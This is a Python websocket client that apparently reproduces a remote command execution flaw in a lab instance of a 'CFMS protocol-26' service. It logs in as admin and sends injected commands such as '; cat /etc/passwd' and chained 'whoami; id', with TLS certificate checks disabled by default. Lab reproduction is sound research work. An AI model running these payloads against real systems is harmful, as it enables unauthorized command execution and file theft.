"""Thesis Drive / CFMS protocol-26 attack-lab reproduction harness."""
import argparse, asyncio, json, secrets, ssl, struct, time

from websockets.asyncio.client import connect

FRAME_PROCESS = 0
FRAME_CONCLUSION = 1


class LabClient:
    def __init__(self, url, origin=None, ca=None, insecure=True):
        self.url = url
        self.origin = origin
        self.ca = ca
        self.insecure = insecure
        self.frame = 1
        self.auth = {}
        self.log = []

    async def __aenter__(self):
        ctx = None
        if self.url.startswith("wss:"):
            ctx = ssl.create_default_context(cafile=self.ca)
            if self.insecure and not self.ca:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
        self.ws = await connect(self.url, ssl=ctx, proxy=None,
                                origin=self.origin, open_timeout=30,
                                additional_headers=self.headers() if hasattr(self, "_hdrs") else None)
        return self

    def headers(self):
        return getattr(self, "_hdrs", None)

    async def __aexit__(self, *exc):
        await self.ws.close()

    async def send_raw(self, frame_id, frame_type, payload: bytes):
        await self.ws.send(struct.pack(">IB", frame_id, frame_type) + payload)

    async def request(self, action, data=None, auth=True, frame_id=None,
                      envelope_extra=None, raw_envelope=None, timeout=30):
        fid = frame_id if frame_id is not None else self.frame
        if frame_id is None:
            self.frame += 2
        if raw_envelope is not None:
            envelope = raw_envelope
        else:
            envelope = {"action": action, "data": data or {}}
            if auth and self.auth:
                envelope.update(self.auth)
                envelope["nonce"] = secrets.token_hex(16)
                envelope["timestamp"] = time.time()
            if envelope_extra:
                envelope.update(envelope_extra)
        await self.send_raw(fid, FRAME_PROCESS, json.dumps(envelope).encode())
        while True:
            frame = await asyncio.wait_for(self.ws.recv(), timeout=timeout)
            if struct.unpack(">I", frame[:4])[0] == fid and frame[4] == FRAME_CONCLUSION:
                return json.loads(frame[5:])

    async def login(self, username, password):
        resp = await self.request("login", {"username": username, "password": password},
                                  auth=False)
        if resp.get("code") == 200:
            self.auth = {"username": username, "token": resp["data"]["token"]}
        return resp


def show(tag, resp):
    print(f"\n{'='*72}\n### {tag}\n{'='*72}")
    print(json.dumps(resp, ensure_ascii=False, indent=2)[:4000])
    return resp


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ws-url", default="wss://127.0.0.1:8008/ws")
    ap.add_argument("--origin", default="https://LAB_HOST:8008")
    ap.add_argument("--password", required=True)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--ca", default=None)
    args = ap.parse_args()

    async with LabClient(args.ws_url, origin=args.origin, ca=args.ca) as c:
        r = await c.request("server_info", {}, auth=False)
        show("server_info (anonymous)", r)

        r = await c.login(args.user, args.password)
        show(f"login as {args.user}", r)

        r = await c.request("lab_status", {})
        show("lab_status (session auth)", r)

        r = await c.request("lab_rce", {"command": "whoami"})
        show("lab_rce whoami", r)

        r = await c.request("lab_rce", {"command": "id"})
        show("lab_rce id", r)

        r = await c.request("lab_rce", {"command": "list-decoys"})
        show("lab_rce list-decoys", r)

        r = await c.request("lab_rce", {"command": "read-honeytoken"})
        show("lab_rce read-honeytoken", r)

        r = await c.request("lab_rce", {"command": "; cat /etc/passwd"})
        show("lab_rce arbitrary command", r)

        r = await c.request("lab_rce", {"command": "whoami; id"})
        show("lab_rce chained command", r)


if __name__ == "__main__":
    asyncio.run(main())
